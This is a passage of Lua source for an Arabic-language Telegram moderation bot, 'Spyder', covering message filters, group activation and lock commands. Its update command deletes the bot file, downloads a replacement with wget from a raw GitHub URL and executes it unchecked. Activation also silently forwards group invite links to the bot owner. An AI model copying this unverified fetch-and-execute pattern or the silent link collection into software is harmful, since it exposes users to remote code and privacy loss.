if msg.content_.ID == 'MessageContact' and not Vips(msg) then      
if redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Owners(msg) then 
local filter = redis:smembers('Spyder:'..bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, "⌔︙العضو ↫ {[@"..data.username_.."]}\n⌔︙عذراً لايمكنك ارسل الملصق في المجموعه \n" ) 
else
send(msg.chat_id_,0, "⌔︙العضو ↫ {["..data.first_name_.."](T.ME/Spyder)}\n⌔︙عذراً لايمكنك ارسل الملصق في المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Owners(msg) then 
local filter = redis:smembers('Spyder:'..bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔︙العضو ↫ {[@"..data.username_.."]}\n⌔︙عذراً لايمكنك ارسل الصوره في المجموعه \n" ) 
else
send(msg.chat_id_,0,"⌔︙العضو ↫ {["..data.first_name_.."](T.ME/Spyder)}\n⌔︙عذراً لايمكنك ارسل الصوره في المجموعه \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Owners(msg) then 
local filter = redis:smembers('Spyder:'..bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔︙العضو ↫ {[@"..data.username_.."]}\n⌔︙عذراً لايمكنك ارسل المتحركه في المجموعه \n") 
else
send(msg.chat_id_,0,"⌔︙العضو ↫ {["..data.first_name_.."](T.ME/Spyder)}\n⌔︙عذراً لايمكنك ارسل المتحركه في المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text == 'تفعيل' and Sudo_bot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get('Spyder:'..bot_id..'Num:Add:Bot') or 0) and not Sudo_id(msg) then
send(msg.chat_id_, msg.id_,'⌔︙عدد اعضاء المجموعه اقل من *~ {'..(redis:get('Spyder:'..bot_id..'Num:Add:Bot') or 0)..'* عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if redis:sismember('Spyder:'..bot_id..'Groups_Users',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⌔︙المجموعه مفعله بالتأكيد ')
else
sendText(msg.chat_id_,'\n⌔︙ بواسطة : ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n⌔︙ تم تفعيل المجموعه {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
redis:sadd('Spyder:'..bot_id..'Groups_Users',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '⌔︙تمت اضافتي الى مجموعة جديدة\n'..
'\n⌔︙بواسطة ↫ '..Name..''..
'\n⌔︙ايدي المجموعه ↫ `'..IdChat..'`'..
'\n⌔︙عدد اعضاء المجموعه *↫ '..NumMember..'*'..
'\n⌔︙اسم المجموعه ↫ ['..NameChat..']'..
'\n⌔︙الرابط ↫ ['..LinkGp..']'
if not Sudo_id(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تعطيل' and Sudo_bot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not redis:sismember('Spyder:'..bot_id..'Groups_Users',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⌔︙المجموعه معطله سابقا ')
else
sendText(msg.chat_id_,'\n⌔︙ بواسطة : ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n⌔︙ تم تعطيل المجموعه {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
redis:srem('Spyder:'..bot_id..'Groups_Users',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
redis:set('Spyder:'..bot_id.."Private:Group:Link"..msg.chat_id_,LinkGp) 

Text = '⌔︙تم طردي من المجموعة\n'..
'\n⌔︙بواسطة ↫ '..Name..''..
'\n⌔︙ايدي المجموعه ↫ `'..IdChat..'`'..
'\n⌔︙اسم المجموعه ↫ ['..NameChat..']'..
'\n⌔︙الرابط ↫ ['..LinkGp..']'
if not Sudo_id(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo_bot(msg) and not redis:get('Spyder:'..bot_id..'Free:Add:Bots') then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⌔︙البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'الادمن'
else 
var= 'عضو'
end
if redis:sismember('Spyder:'..bot_id..'Groups_Users',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⌔︙المجموعه مفعله سابقا ')
else
if tonumber(data.member_count_) < tonumber(redis:get('Spyder:'..bot_id..'Num:Add:Bot') or 0) and not Sudo_id(msg) then
send(msg.chat_id_, msg.id_,'⌔︙عدد اعضاء المجموعه اقل من *~ {'..(redis:get('Spyder:'..bot_id..'Num:Add:Bot') or 0)..'* عضو')
return false
end
sendText(msg.chat_id_,'\n⌔︙ بواسطة : ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n⌔︙ تم تفعيل المجموعه {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
redis:sadd('Spyder:'..bot_id..'Groups_Users',msg.chat_id_)  
redis:sadd('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = '⌔︙تمت اضافتي الى مجموعة جديدة\n'..
'\n⌔︙بواسطة ↫ '..Name..''..
'\n⌔︙موقعه في المجموعه ↫ '..AddPy..'' ..
'\n⌔︙ايدي المجموعه ↫ `'..IdChat..'`'..
'\n⌔︙عدد اعضاء المجموعه *↫ '..NumMember..'*'..
'\n⌔︙اسم المجموعه ↫ ['..NameChat..']'..
'\n⌔︙الرابط ↫ ['..LinkGp..']'
if not Sudo_id(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end

if text and text:match("^ضع شرط التفعيل (%d+)$") and Sudo_id(msg) then
local Num = text:match("ضع شرط التفعيل (%d+)$") 
redis:set('Spyder:'..bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'⌔︙ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
if text == 'تحديث السورس' and Sudo_id(msg) then
os.execute('rm -rf Spyder.lua')
os.execute('wget https://raw.githubusercontent.com/DevSpyder/Spyder/master/Spyder.lua')
send(msg.chat_id_, msg.id_,'⌔︙ تم تحديث السورس \n⌔︙ بواسطة : ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')') 
dofile('Spyder.lua')  
end
------------------------------------------------------------------
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
Text = [[
🔕 ︙ هلا حبي شتريد من السورس
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and Groups_Users(msg.chat_id_) == true then
if text == 'رفع النسخه الاحتياطيه' and Sudo_id(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'نسخه احتياطيه للمجموعات' and Sudo_id(msg) then 
GetFile_Bot(msg)
end
------------------------------------------------------------------
if text == "الاوامر المضافه" and Constructor(msg) then
local list = redis:smembers('Spyder:'..bot_id.."List:ZaYon:Group:New"..msg.chat_id_.."")
t = "⌔︙قائمه الاوامر المضافه  \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
Cmds = redis:get('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end
if #list == 0 then
t = "⌔︙لا توجد اوامر اضافيه"
end
send(msg.chat_id_, msg.id_,"["..t.."]")
end
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then
if Constructor(msg) then 
local list = redis:smembers('Spyder:'..bot_id.."List:ZaYon:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
redis:del('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..":"..v)
redis:del('Spyder:'..bot_id.."List:ZaYon:Group:New"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"⌔︙تم مسح جميع الاوامر التي تم اضافتها")  
end
end
if text == "اضف امر" and Constructor(msg) then
redis:set('Spyder:'..bot_id.."Set:Za:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"⌔︙الان ارسل لي الامر القديم ..")  
return false
end
if text == "حذف امر" or text == "مسح امر" then 
if Constructor(msg) then
redis:set('Spyder:'..bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"⌔︙ارسل الامر الذي قم بوضعه بدلا عن القديم")  
return false
end
end
if text == 'حذف رد المطور' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Sudo_bot:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حدف رد المطور")
end
if text == 'حذف رد المنشئ الاساسي' and Owners(msg) then
redis:del('Spyder:'..bot_id.."BasicConstructor:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد المنشئ الاساسي ")
end
if text == 'حذف رد المنشئ' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Constructor:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد المنشئ ")
end
if text == 'حذف رد المدير' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Owners:Reply"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد المدير ")
end
if text == 'حذف رد الادمن' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Mod:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد الادمن ")
end
if text == 'حذف رد المميز' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Vips:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد المميز")
end
if text == 'حذف رد العضو' and Owners(msg) then
redis:del('Spyder:'..bot_id.."Memp:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"⌔︙تم حذف رد العضو")
end
--------------------------------------------------------------------------------------------------------------
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Owners(msg) then 
redis:set('Spyder:'..bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙ تـم قفـل الدردشه ')  
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل اضافة الاعضاء ')  
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل دخول الاعضاء ')  
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل البوتات بالحذف')  
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل البوتات بالطرد')  
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
redis:set('Spyder:'..bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الاشعارات بالحذف')  
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set('Spyder:'..bot_id.."lockpin"..msg.chat_id_, true) 
redis:sadd('Spyder:'..bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  redis:set('Spyder:'..bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم قفـل التثبيت هنا ')  
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set('Spyder:'..bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل تعديل بالحذف')  
end,nil)   
elseif text == 'قفل الفشار' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل الفشار بالحذف')  
end,nil)   
elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id..'lock:Iran'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم قفل الفارسيه بالحذف')  
end,nil)   
elseif text == 'قفل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set('Spyder:'..bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم قفـل تعديل الميديا')  
end,nil)   
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:set('Spyder:'..bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","Lock:Inlen","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
redis:set('Spyder:'..bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙تم قفل الكل')  
end,nil)   
end
if text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح اضافة الاعضاء ')  
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Owners(msg) then 
redis:del('Spyder:'..bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح الدردشه')  
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فتح دخول الاعضاء ')  
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فـتح البوتات ')  
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فـتح البوتات')  
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
redis:del('Spyder:'..bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فـتح الاشعارات')  
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del('Spyder:'..bot_id.."lockpin"..msg.chat_id_)  
redis:srem('Spyder:'..bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فـتح التثبيت هنا ')  
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del('Spyder:'..bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فـتح تعديل')  
end,nil)   
elseif text == 'فتح الفشار' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تـم فـتح الفشار')  
end,nil)   
elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
redis:del('Spyder:'..bot_id..'lock:Iran'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..') \n⌔︙ تم فتح الفارسيه')  
end,nil)   
elseif text == 'فتح الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del('Spyder:'..bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تـم فـتح تعديل الميديا')  
end,nil)   
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
